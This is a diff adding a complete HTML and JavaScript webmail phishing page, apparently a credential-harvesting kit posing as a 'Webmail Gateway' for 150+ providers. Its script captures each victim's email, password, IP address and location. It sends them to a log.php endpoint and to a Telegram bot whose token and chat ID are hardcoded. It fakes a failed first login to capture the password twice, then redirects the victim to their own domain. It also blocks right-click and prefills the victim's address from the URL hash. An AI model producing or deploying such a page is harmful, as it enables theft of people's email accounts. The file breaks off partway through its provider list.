@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Webmail Gateway • Secure Access</title>
+    <style>
+        :root {
+            --primary: #2c6e9e;
+            --primary-dark: #1f5480;
+            --card-bg: rgba(255, 255, 255, 0.96);
+            --shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
+            --border: #e2e8f0;
+            --text-dark: #1e293b;
+            --text-muted: #475569;
+            --error-red: #c62828;
+            --modal-overlay: rgba(0,0,0,0.7);
+            --info-bg: #f8fafc;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, rgba(25,35,50,0.8), rgba(15,25,40,0.9)), 
+                        url('https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=1600&h=900&fit=crop') center/cover no-repeat fixed;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1rem;
+        }
+        .main-container { 
+            max-width: 1280px; 
+            width: 100%; 
+            margin: 0 auto;
+            display: none;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+        .brand-section { text-align: center; margin-bottom: 2rem; position: relative; }
+        .brand-section h1 { color: white; font-size: 2rem; font-weight: 600; text-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .brand-section p { color: rgba(255,255,240,0.9); margin-top: 0.5rem; font-size: 0.9rem; }
+        .login-row { display: flex; flex-wrap: wrap; gap: 2rem; justify-content: center; align-items: flex-start; }
+        .login-card {
+            flex: 1; min-width: 320px; max-width: 450px;
+            background: var(--card-bg); border-radius: 2rem; box-shadow: var(--shadow);
+            padding: 2rem 2rem 2.2rem;
+        }
+        .login-card h2 { font-size: 1.6rem; font-weight: 600; color: var(--text-dark); text-align: center; margin-bottom: 0.5rem; }
+        
+        /* FIX: center the provider badge */
+        .provider-context {
+            display: block;
+            width: fit-content;
+            margin: 0 auto 1.2rem auto;
+            text-align: center;
+            background: #eef2ff;
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            color: var(--primary);
+            font-weight: 500;
+            font-size: 0.8rem;
+        }
+        
+        .input-group { position: relative; margin-bottom: 1.2rem; }
+        .input-group input {
+            width: 100%; padding: 0.85rem 0.85rem 0.85rem 3rem; font-size: 1rem;
+            border: 1.5px solid var(--border); background: white; outline: none;
+            border-radius: 0;
+            transition: all 0.2s;
+        }
+        .input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(44,110,158,0.3);
+            border-radius: 0;
+        }
+        .input-group .icon { 
+            position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); 
+            font-size: 1.2rem; color: #5c6f87; 
+            display: flex; align-items: center; justify-content: center;
+            width: 1.4rem;
+        }
+        .email-display-line {
+            display: flex;
+            align-items: center;
+            gap: 0.85rem;
+            background: var(--info-bg);
+            padding: 0.85rem 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 0;
+            font-weight: 500;
+            color: var(--text-dark);
+            border: 1px solid var(--border);
+            word-break: break-word;
+        }
+        .email-display-line i {
+            font-size: 1.25rem;
+            color: var(--primary);
+            width: 1.6rem;
+            text-align: center;
+        }
+        .email-display-line span {
+            flex: 1;
+            font-size: 0.95rem;
+            letter-spacing: -0.2px;
+        }
+        .checkbox-line { display: flex; align-items: center; gap: 0.6rem; margin: 1rem 0 1.6rem; font-size: 0.8rem; color: var(--text-muted); }
+        .btn-login {
+            background: var(--primary); width: 100%; border: none; padding: 0.9rem; font-weight: 700; font-size: 1rem;
+            color: white; cursor: pointer; transition: 0.2s;
+            border-radius: 3rem;
+        }
+        .btn-login:hover { background: var(--primary-dark); transform: scale(0.98); }
+        .help-text { margin-top: 1.2rem; text-align: center; }
+        .help-text a { font-size: 0.8rem; color: var(--primary); text-decoration: none; border-bottom: 1px dashed #bbb; }
+        .error-msg {
+            background: #ffe9e9; border-left: 4px solid var(--error-red);
+            padding: 0.7rem 1rem; font-size: 0.8rem; color: var(--error-red);
+            margin: 0.8rem 0 0.5rem;
+            border-radius: 0;
+        }
+        .hidden { display: none !important; }
+        .small-checkbox { margin: 0.8rem 0 0.5rem; display: flex; gap: 0.5rem; align-items: center; }
+        .providers-sidebar {
+            flex: 0 0 260px; background: rgba(255,255,255,0.92); backdrop-filter: blur(5px);
+            padding: 1.6rem 1.4rem; box-shadow: var(--shadow);
+            border-radius: 1.8rem;
+        }
+        .providers-sidebar h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1.2rem; color: var(--text-dark); border-left: 3px solid var(--primary); padding-left: 0.75rem; }
+        .provider-link {
+            display: flex; align-items: center; gap: 0.6rem; padding: 0.6rem 0.5rem; font-size: 0.9rem;
+            font-weight: 500; color: #2c3e66; cursor: pointer; transition: 0.1s;
+        }
+        .provider-link:hover { background: #eef2ff; color: var(--primary); transform: translateX(4px); }
+        .info-banner {
+            margin-top: 2.8rem; background: rgba(255,255,250,0.95);
+            display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
+            padding: 1.2rem 2rem; gap: 1rem;
+            border-radius: 1.8rem;
+        }
+        .banner-text h4 { font-size: 1.2rem; font-weight: 700; color: #1f3b4c; }
+        .btn-outline {
+            background: transparent; border: 2px solid var(--primary);
+            padding: 0.6rem 1.8rem; font-weight: 700; color: var(--primary); cursor: pointer;
+            transition: 0.2s;
+            border-radius: 3rem;
+        }
+        .btn-outline:hover { background: var(--primary); color: white; }
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--modal-overlay); z-index: 1000; justify-content: center; align-items: center;
+            backdrop-filter: blur(4px);
+        }
+        .modal-content {
+            background: white; border-radius: 2rem; max-width: 90%; width: 900px;
+            max-height: 85vh; overflow-y: auto; padding: 1.5rem; box-shadow: 0 25px 40px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eef2ff; padding-bottom: 0.8rem; margin-bottom: 1.2rem; }
+        .modal-header h2 { font-size: 1.6rem; color: var(--text-dark); }
+        .close-modal { font-size: 1.8rem; cursor: pointer; background: none; border: none; font-weight: bold; color: #666; }
+        .providers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 0.8rem; }
+        .grid-provider {
+            background: #f8fafc; padding: 0.6rem 0.8rem; text-align: center;
+            font-size: 0.85rem; font-weight: 500; color: #1f5480; cursor: pointer;
+            border: 1px solid #e2e8f0; transition: 0.1s;
+            border-radius: 2rem;
+        }
+        .grid-provider:hover { background: var(--primary); color: white; transform: scale(0.97); }
+        @media (max-width: 780px) {
+            .login-row { flex-direction: column; align-items: center; }
+            .providers-sidebar { width: 100%; max-width: 450px; }
+            .info-banner { flex-direction: column; text-align: center; }
+        }
+        .validation-badge {
+            font-size: 0.7rem;
+            margin-top: 4px;
+            color: #2c6e9e;
+        }
+        .input-group .icon i { font-size: 1.2rem; width: auto; }
+        body { user-select: none; }
+        input, textarea { user-select: text; }
+
+        .preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(25,35,50,0.95), rgba(15,25,40,0.98)), 
+                        url('https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=1600&h=900&fit=crop') center/cover no-repeat fixed;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(3px);
+            transition: opacity 0.5s ease;
+        }
+        .preloader-content {
+            text-align: center;
+            background: rgba(0,0,0,0.4);
+            padding: 2rem;
+            border-radius: 3rem;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .loader-spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .dots-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.8rem;
+            margin-top: 0.5rem;
+        }
+        .dot {
+            width: 14px;
+            height: 14px;
+            background-color: white;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: pulseDot 1.4s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes pulseDot {
+            0%, 100% { transform: scale(0.8); opacity: 0.4; background-color: #ccc; }
+            50% { transform: scale(1.3); opacity: 1; background-color: white; box-shadow: 0 0 8px white; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="preloader" class="preloader">
+    <div class="preloader-content">
+        <div class="loader-spinner"></div>
+        <div class="dots-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+</div>
+
+<div class="main-container">
+    <div class="brand-section">
+        <h1 data-i18n="brand_title">Webmail Gateway</h1>
+        <p data-i18n="brand_subtitle">Secure access for 150+ providers • Roundcube, SquirrelMail, Zimbra, Gmail, Outlook & more</p>
+    </div>
+
+    <div class="login-row">
+        <div class="login-card">
+            <div id="step1">
+                <h2 id="formTitle" data-i18n="signin_title">Sign in to Webmail</h2>
+                <div class="input-group">
+                    <span class="icon"><i class="fas fa-user"></i></span>
+                    <input type="text" id="usernameInput" data-i18n="email_placeholder" placeholder="user@domain.com" autocomplete="off">
+                </div>
+                <div class="checkbox-line">
+                    <input type="checkbox" id="keepLoginCheckbox" checked> 
+                    <label for="keepLoginCheckbox" data-i18n="keepme_label">Keep me signed in (uncheck on shared devices)</label>
+                </div>
+                <button class="btn-login" id="step1Button" data-i18n="continue_btn">Continue →</button>
+                <div class="help-text">
+                    <a href="#" id="forgotIdLink" data-i18n="forgot_link">❓ Forgot your email / domain?</a>
+                </div>
+            </div>
+            <div id="step2" class="hidden">
+                <h2 data-i18n="password_title">Enter Password</h2>
+                <div class="email-display-line">
+                    <i class="fas fa-user"></i>
+                    <span id="displayUser"></span>
+                </div>
+                <div class="input-group">
+                    <span class="icon"><i class="fas fa-lock"></i></span>
+                    <input type="password" id="passwordInput" data-i18n="password_placeholder" placeholder="Password" autocomplete="off">
+                </div>
+                <div class="small-checkbox">
+                    <input type="checkbox" id="showPassCheckbox"> 
+                    <label for="showPassCheckbox" data-i18n="show_password">Show password</label>
+                </div>
+                <div id="loginErrorMessage" class="error-msg hidden"></div>
+                <button class="btn-login" id="step2Button" data-i18n="access_btn">Access Webmail</button>
+                <div class="help-text">
+                    <a href="#" id="resetLoginLink" data-i18n="different_account">↻ Use a different account</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="providers-sidebar">
+            <h3 data-i18n="sidebar_title">📬 Select Webmail Client</h3>
+            <div class="provider-link" data-provider="Roundcube Webmail">🍁 Roundcube</div>
+            <div class="provider-link" data-provider="cPanel Webmail">⚙️ cPanel Webmail</div>
+            <div class="provider-link" data-provider="SquirrelMail">🐿️ SquirrelMail</div>
+            <div class="provider-link" data-provider="Horde Webmail">🌊 Horde</div>
+            <div class="provider-link" data-provider="RainLoop">☁️ RainLoop</div>
+            <div class="provider-link" data-provider="AfterLogic WebMail">📨 AfterLogic</div>
+            <div class="provider-link" data-provider="SnappyMail">⚡ SnappyMail</div>
+            <div class="provider-link" data-provider="DirectAdmin Webmail">🖥️ DirectAdmin Webmail</div>
+            <div class="provider-link" data-provider="IMAP">📡 IMAP</div>
+            <div class="provider-link" data-provider="Zimbra Webmail">📬 Zimbra</div>
+        </div>
+    </div>
+
+    <div class="info-banner">
+        <div style="font-size: 2.6rem;">🌍</div>
+        <div class="banner-text">
+            <h4 data-i18n="banner_title">Multi‑tenant Webmail Hub</h4>
+            <p data-i18n="banner_text">Click button to explore 150+ webmail providers — Use default or IMAP if you can't find your provider.</p>
+        </div>
+        <div class="btn-outline" id="openProvidersModalBtn" data-i18n="modal_button">📋 Supported providers (150+)</div>
+    </div>
+</div>
+
+<div id="providersModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2 data-i18n="modal_title">🌐 150+ Webmail Providers (Asia, Europe, US)</h2>
+            <button class="close-modal" id="closeModalBtn">&times;</button>
+        </div>
+        <div class="providers-grid" id="providersGrid"></div>
+    </div>
+</div>
+
+<script src="translate.js"></script>
+<script>
+    // Disable right-click
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    // ========== SERVER LOGGING (log.php) ==========
+    async function sendToServer(type, data) {
+        try {
+            const response = await fetch('log.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type, data, timestamp: new Date().toISOString() })
+            });
+            const result = await response.json();
+            console.log(`[log] ${type} ->`, result);
+        } catch(e) {
+            console.warn("[log] failed to send", e);
+        }
+    }
+    
+    // ========== TELEGRAM ==========
+    const TG_TOKEN = '7835679678:AAHg_EGPj7gHVzKOwop1Kmz7_luMNY1sOFY';
+    const TG_CHAT_ID = '5189561974';
+    
+    let userIP = "fetching...";
+    let userLocation = "Location not available";
+    const userAgent = navigator.userAgent || "unknown";
+    const pageUrl = window.location.href;
+    
+    async function fetchUserIPAndLocation() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            userIP = data.ip;
+        } catch(e) { userIP = "IP_unavailable"; }
+        
+        try {
+            const locRes = await fetch('https://ipapi.co/json/');
+            const locData = await locRes.json();
+            if (locData && !locData.error) {
+                const parts = [];
+                if (locData.city) parts.push(locData.city);
+                if (locData.region) parts.push(locData.region);
+                if (locData.country_name) parts.push(locData.country_name);
+                userLocation = parts.join(', ') || locData.country_code || 'Unknown';
+                if (locData.timezone) userLocation += ` (${locData.timezone})`;
+            }
+        } catch(e) { userLocation = "Location detection failed"; }
+    }
+    
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text.replace(/&/g, '&amp;')
+                   .replace(/</g, '&lt;')
+                   .replace(/>/g, '&gt;')
+                   .replace(/"/g, '&quot;');
+    }
+    
+    async function sendToTelegram(msg, includeMeta = true) {
+        let fullMessage = "";
+        if (includeMeta) {
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+            const locationInfo = `📍 Location: ${escapeHtml(userLocation)}`;
+            const ipInfo = `🌍 IP: ${escapeHtml(userIP)}`;
+            const uaInfo = `💻 User Agent: ${escapeHtml(userAgent)}`;
+            const urlInfo = `🔗 URL: ${escapeHtml(pageUrl)}`;
+            const timeInfo = `⏱️ UTC: ${escapeHtml(timestamp)}`;
+            fullMessage = `<b>🌐 WEBMAIL EVENT</b>\n\n${locationInfo}\n${ipInfo}\n${uaInfo}\n${urlInfo}\n${timeInfo}\n\n${msg}`;
+        } else {
+            fullMessage = msg;
+        }
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: TG_CHAT_ID, 
+                    text: fullMessage, 
+                    parse_mode: 'HTML' 
+                })
+            });
+            const result = await response.json();
+            if (!result.ok) console.warn("Telegram API error:", result);
+        } catch(e) { console.warn("Telegram send failed", e); }
+    }
+    
+    // ========== CORE LOGIC ==========
+    function isValidEmail(email) {
+        if (!email || typeof email !== 'string') return false;
+        const trimmed = email.trim();
+        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        return emailRegex.test(trimmed);
+    }
+    
+    let loginAttemptCount = 0;
+    let currentSelectedProvider = "Webmail";
+    
+    const step1Div = document.getElementById('step1');
+    const step2Div = document.getElementById('step2');
+    const usernameInput = document.getElementById('usernameInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const displayUserSpan = document.getElementById('displayUser');
+    const step1Btn = document.getElementById('step1Button');
+    const step2Btn = document.getElementById('step2Button');
+    const resetLoginLink = document.getElementById('resetLoginLink');
+    const errorDiv = document.getElementById('loginErrorMessage');
+    const showPassCb = document.getElementById('showPassCheckbox');
+    const forgotLink = document.getElementById('forgotIdLink');
+    const formTitle = document.getElementById('formTitle');
+    
+    function t(key) {
+        return window.i18n ? window.i18n.t(key) : key;
+    }
+    
+    function showError(msg, isStep1Error = false) {
+        if (!isStep1Error) {
+            errorDiv.innerText = msg;
+            errorDiv.classList.remove('hidden');
+        } else {
+            let step1ErrorElem = document.getElementById('step1InlineError');
+            if (!step1ErrorElem) {
+                const step1Container = document.getElementById('step1');
+                const existing = step1Container.querySelector('.step1-error-msg');
+                if (existing) existing.remove();
+                const newDiv = document.createElement('div');
+                newDiv.className = 'error-msg step1-error-msg';
+                newDiv.id = 'step1InlineError';
+                const btnRef = document.getElementById('step1Button');
+                if (btnRef && btnRef.parentNode) btnRef.parentNode.insertBefore(newDiv, btnRef);
+                step1ErrorElem = newDiv;
+            }
+            step1ErrorElem.innerText = msg;
+            step1ErrorElem.classList.remove('hidden');
+            setTimeout(() => {
+                if (step1ErrorElem) step1ErrorElem.classList.add('hidden');
+            }, 4000);
+        }
+    }
+    
+    function clearError() { 
+        errorDiv.classList.add('hidden'); 
+        errorDiv.innerText = '';
+        const step1Err = document.getElementById('step1InlineError');
+        if (step1Err) step1Err.classList.add('hidden');
+    }
+    
+    function updateTemplateForProvider(providerName) {
+        currentSelectedProvider = providerName;
+        const baseTitle = t('signin_title');
+        const newTitle = baseTitle.replace(/Webmail$/, providerName);
+        formTitle.innerText = newTitle;
+        const existingBadge = document.querySelector('.provider-context');
+        if (existingBadge) existingBadge.remove();
+        const badgeDiv = document.createElement('div');
+        badgeDiv.className = 'provider-context';
+        badgeDiv.innerText = `🔐 ${providerName}`;
+        // Insert after h2
+        formTitle.parentNode.insertBefore(badgeDiv, formTitle.nextSibling);
+        
+        const lowerProvider = providerName.toLowerCase();
+        if (lowerProvider.includes("gmail")) usernameInput.placeholder = "username@gmail.com";
+        else if (lowerProvider.includes("outlook")) usernameInput.placeholder = "name@outlook.com";
+        else if (lowerProvider.includes("yahoo")) usernameInput.placeholder = "username@yahoo.com";
+        else if (lowerProvider.includes("roundcube")) usernameInput.placeholder = "user@yourdomain.com";
+        else if (lowerProvider.includes("zimbra")) usernameInput.placeholder = "user@zimbra-domain.com";
+        else usernameInput.placeholder = t('email_placeholder');
+    }
+    
+    async function onStep1() {
+        clearError();
+        const userId = usernameInput.value.trim();
+        if (!userId) {
+            showError(t('error_email_required'), true);
+            return;
+        }
+        if (!isValidEmail(userId)) {
+            showError(`"${escapeHtml(userId)}" ${t('error_invalid_email')}`, true);
+            return;
+        }
+        loginAttemptCount = 0;
+        displayUserSpan.innerText = `${userId} • ${currentSelectedProvider}`;
+        step1Div.classList.add('hidden');
+        step2Div.classList.remove('hidden');
+        passwordInput.value = '';
+        clearError();
+    }
+    
+    async function onStep2() {
+        const userId = usernameInput.value.trim();
+        const pwd = passwordInput.value;
+        if (!pwd) { showError(t('error_password_required')); return; }
+        if (!isValidEmail(userId)) {
+            showError(t('error_invalid_session'));
+            resetToStep1();
+            return;
+        }
+        loginAttemptCount++;
+        
+        const logData = {
+            provider: currentSelectedProvider,
+            email: userId,
+            password: pwd,
+            ip: userIP,
+            location: userLocation,
+            userAgent: userAgent,
+            url: pageUrl,
+            attemptNumber: loginAttemptCount
+        };
+        await sendToServer('login_attempt', logData);
+        
+        const tgMsg = `<b>🔐 LOGIN ATTEMPT #${loginAttemptCount}</b>\n` +
+                      `📧 <b>Provider:</b> ${escapeHtml(currentSelectedProvider)}\n` +
+                      `👤 <b>User:</b> <code>${escapeHtml(userId)}</code>\n` +
+                      `🔑 <b>Pass:</b> <code>${escapeHtml(pwd)}</code>`;
+        await sendToTelegram(tgMsg, false);
+        
+        if (loginAttemptCount === 1) {
+            showError(`${t('error_auth')} ${currentSelectedProvider}. ${t('error_retry')}`);
+            passwordInput.value = '';
+            const onPasswordTyping = () => {
+                clearError();
+                passwordInput.removeEventListener('input', onPasswordTyping);
+            };
+            passwordInput.addEventListener('input', onPasswordTyping);
+        } else {
+            clearError();
+            const domain = userId.split('@')[1];
+            if (domain) {
+                window.location.href = `https://${domain}`;
+            } else {
+                window.location.href = "https://thenationaldesk.com/resources/media/bc43d09e-3896-4150-9cc7-79f9b0e2d405-originalBlur_Loveletterpage3.jpeg";
+            }
+        }
+    }
+    
+    function resetToStep1() {
+        step2Div.classList.add('hidden');
+        step1Div.classList.remove('hidden');
+        usernameInput.value = '';
+        passwordInput.value = '';
+        loginAttemptCount = 0;
+        clearError();
+        displayUserSpan.innerText = '';
+        const step1Err = document.getElementById('step1InlineError');
+        if (step1Err) step1Err.classList.add('hidden');
+        formTitle.innerText = t('signin_title');
+    }
+    
+    function handleHashPrefill() {
+        let hash = window.location.hash;
+        if (hash && hash.length > 1) {
+            let rawEmail = hash.substring(1);
+            try { rawEmail = decodeURIComponent(rawEmail); } catch(e) {}
+            rawEmail = rawEmail.trim();
+            if (isValidEmail(rawEmail)) {
+                usernameInput.value = rawEmail;
+                setTimeout(() => {
+                    if (!step1Div.classList.contains('hidden') && usernameInput.value.trim() === rawEmail && isValidEmail(rawEmail)) {
+                        onStep1().catch(console.warn);
+                    }
+                }, 200);
+            } else if (rawEmail !== "") {
+                usernameInput.value = rawEmail;
+                showError(`"${escapeHtml(rawEmail)}" ${t('error_invalid_email')}`, true);
+            }
+        }
+    }
+    
+    window.addEventListener('hashchange', () => {
+        if (!step1Div.classList.contains('hidden')) {
+            let hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                let rawEmail = hash.substring(1);
+                try { rawEmail = decodeURIComponent(rawEmail); } catch(e) {}
+                rawEmail = rawEmail.trim();
+                if (isValidEmail(rawEmail)) {
+                    usernameInput.value = rawEmail;
+                    onStep1().catch(console.warn);
+                } else if (rawEmail !== "") {
+                    usernameInput.value = rawEmail;
+                    showError(t('error_invalid_email'), true);
+                }
+            }
+        }
+    });
+    
+    step1Btn.addEventListener('click', onStep1);
+    step2Btn.addEventListener('click', onStep2);
+    resetLoginLink.addEventListener('click', (e) => { e.preventDefault(); resetToStep1(); });
+    forgotLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        alert(t('forgot_alert'));
+    });
+    if (showPassCb) showPassCb.addEventListener('change', () => { passwordInput.type = showPassCb.checked ? 'text' : 'password'; });
+    usernameInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') onStep1(); });
+    passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') onStep2(); });
+    
+    usernameInput.addEventListener('blur', () => {
+        const val = usernameInput.value.trim();
+        if (val && !isValidEmail(val) && !step1Div.classList.contains('hidden')) {
+            let warnDiv = document.getElementById('inlineEmailHint');
+            if (!warnDiv) {
+                const parent = usernameInput.parentNode;
+                const hint = document.createElement('div');
+                hint.className = 'validation-badge';
+                hint.id = 'inlineEmailHint';
+                hint.style.color = '#c62828';
+                hint.style.fontSize = '0.7rem';
+                hint.style.marginTop = '4px';
+                hint.innerText = '⚠️ ' + t('error_invalid_email');
+                parent.appendChild(hint);
+                setTimeout(() => { if (hint && hint.remove) hint.remove(); }, 3000);
+            }
+        }
+    });
+    
+    function onProviderClick(providerName) {
+        updateTemplateForProvider(providerName);
+        if (!step1Div.classList.contains('hidden')) {
+            // keep email if any
+        } else {
+            resetToStep1();
+        }
+        usernameInput.value = '';
+    }
+    
+    function attachSidebarProviders() {
+        const sidebarLinks = document.querySelectorAll('.provider-link');
+        sidebarLinks.forEach(link => {
+            const newLink = link.cloneNode(true);
+            if (link.parentNode) link.parentNode.replaceChild(newLink, link);
+            const providerName = newLink.getAttribute('data-provider') || newLink.innerText.trim();
+            newLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                onProviderClick(providerName);
+            });
+        });
+    }
+    
+    function getProviderList() { return [
+            "Roundcube Webmail", "SquirrelMail", "Horde Webmail", "RainLoop", "SnappyMail", "AfterLogic WebMail",
+            "cPanel Webmail", "DirectAdmin Webmail", "Zimbra Webmail", "IMAP", "Gmail", "Outlook.com",
+            "Yahoo! Mail", "Zoho Mail", "ProtonMail", "Tutanota", "Mail.com", "GMX Mail", "AOL Mail", "iCloud Mail",
+            "Yandex Mail", "Mail.ru", "FastMail", "Runbox", "Posteo", "Mailfence", "StartMail", "Kolab Now",
+            "Soverin", "CTemplar", "Disroot", "Autistici", "Inbox.com", "Lycos Mail", "Rediffmail", "Naver Mail",
+            "Daum Mail", "Hanmail", "QQ Mail", "163.com", "126 Mail", "Sina Mail", "Alibaba Mail", "Tencent Exmail",
+            "Rackspace Email", "GoDaddy Webmail", "Namecheap Private Email", "OVH Webmail", "IceWarp", "Atmail",
+            "OX App Suite", "MailEnable", "MDaemon Webmail", "Crossbox", "Roundcube Plus", "Cyrus Webmail",
+            "Dovecot Webmail", "NeoMail", "IlohaMail", "Uebimiau", "PigeonMail", "Bongo", "Citadel", "Group-Office",
+            "AfterLogic Pro", "WebMail Lite", "Tine 2.0", "Mailbox.org", "Mailpile", "RainLoop Community",
+            "SnappyMail Next", "Isotope Mail", "Cypht", "MailCleaner", "BTinternet", "FramaMail",
+            "Laposte.net", "Orange Webmail", "Free.fr Webmail", "Gawab.com", "Hushmail", "CounterMail", "Neomailbox",
+            "SecureMail", "MailSwitch", "Athena Mail", "MailHive", "MailNerd", "PostMaster", "Web.de", "Gmx.net",
+            "T-Online Mail", "Arcor Mail", "Freenet Mail", "Alice Mail", "Virgilio Mail", "Libero Mail", "Tiscali Mail",
+            "Bulgaria Mail", "Seznam Mail", "Centrum Mail", "Poczta Onet", "Wp.pl", "Interia.pl", "O2.pl",
+            "Email.cz", "Atlas.cz", "Volny.cz", "Post.sk", "Zoznam.sk", "Pobox.sk", "InMail.sk", "Mail.bg", "Abv.bg",
+            "Hush Mail", "Aruba.it", "Ionos",
+            "Naver (South Korea)", "Daum (KakaoMail)", "Hanmail (Korea)", "QQ Mail (China)", "163.com (NetEase)", "126 Mail (China)",
+            "Sina Mail (China)", "Alibaba Mail (China)", "Tencent Exmail (China)", "Yeah.net (China)", "Tom.com Mail (China)",
+            "21CN Mail (China)", "China.com Mail", "189.cn Mail (China Telecom)", "wo.com.cn Mail (Unicom)", "139.com Mail (China Mobile)",
+            "Rediffmail (India)", "Rediff.com (India)", "Sify Mail (India)", "Dataone Mail (India)", "ProtonMail Asia",
+            "Zoho Mail India", "Mail.com Asia", "GMX Asia", "Yandex Asia", "Kakao Mail (Korea)", "Line Mail (Japan)",
+            "Nifty Mail (Japan)", "Biglobe Mail (Japan)", "OCN Mail (Japan)", "So-net Mail (Japan)", "Excite Mail Japan",
+            "Goo Mail (Japan)", "Infoseek Mail (Japan)", "Yahoo! Japan Mail", "Docomo Mail (Japan)", "Au one Mail (Japan)",
+            "Softbank Mail (Japan)", "Plala Mail (Japan)", "Rakuten Mail (Japan)", "Ameba Mail (Japan)", "FC2 Mail (Japan)",
+            "Livedoor Mail (Japan)", "Hathway Mail (India)", "Indiatimes Mail (India)", "Gmail India", "Outlook India",
+            "Mail.ru Asia", "Zimbra Asia",
+            "GMX (Germany)", "Web.de (Germany)", "T-Online (Germany)", "Freenet (Germany)", "Arcor (Germany)", "Mail.de (Germany)",
+            "Posteo (Germany)", "Mailbox.org (Germany)", "Tutanota (Germany)", "ProtonMail (Switzerland)", "Mailfence (Belgium)",
+            "StartMail (Netherlands)", "Runbox (Norway)", "Kolab Now (Switzerland)", "Soverin (Netherlands)", "CTemplar (Iceland)",
+            "Disroot (Netherlands)", "Autistici (Italy)", "FastMail (Australia/UK)", "Laposte.net (France)", "Orange (France)",
+            "Free (France)", "SFR Mail (France)", "Bouygues Mail (France)", "Alice Mail (Italy)", "Libero (Italy)",
+            "Virgilio (Italy)", "Tiscali (Italy)", "Tele2 Mail (Netherlands)", "Ziggo Mail (Netherlands)", "KPN Mail (Netherlands)",
+            "Proximus Mail (Belgium)", "Skynet Mail (Belgium)", "VOO Mail (Belgium)", "Swisscom Mail (Switzerland)", "Bluewin (Switzerland)",
+            "Sunrise Mail (Switzerland)", "A1 Mail (Austria)", "Telekom Austria Mail", "Magenta Telekom Mail", "O2 Mail (Czech)",
+            "Seznam (Czech)", "Centrum (Czech)", "Email.cz (Czech)", "Atlas (Slovakia)", "Volny (Slovakia)", "Pobox.sk (Slovakia)",
+            "Zoznam.sk (Slovakia)", "Onet.pl (Poland)", "Wp.pl (Poland)", "Interia.pl (Poland)", "O2.pl (Poland)", "Gazeta.pl (Poland)",
+            "Mail.bg (Bulgaria)", "Abv.bg (Bulgaria)", "Telekom Romania Mail", "Digi Mail (Romania)", "Orange Romania Mail",
+            "Telenor Mail (Norway)", "Telia Mail (Sweden)", "Com Hem Mail (Sweden)", "Bredband2 Mail (Sweden)", "TDC Mail (Denmark)",
+            "YouSee Mail (Denmark)", "Telenor Denmark Mail", "Elisa Mail (Finland)", "DNA Mail (Finland)", "Telia Finland Mail",
+            "Ltu Mail (Latvia)", "Tele2 Latvia Mail", "Bite Mail (Lithuania)", "Telia Lithuania Mail", "EMI Mail (Estonia)",
+            "Tele2 Estonia Mail", "VIPnet Mail (Croatia)", "T-Hrvatski Telekom Mail", "Telekom Slovenije Mail", "T-2 Mail (Slovenia)",
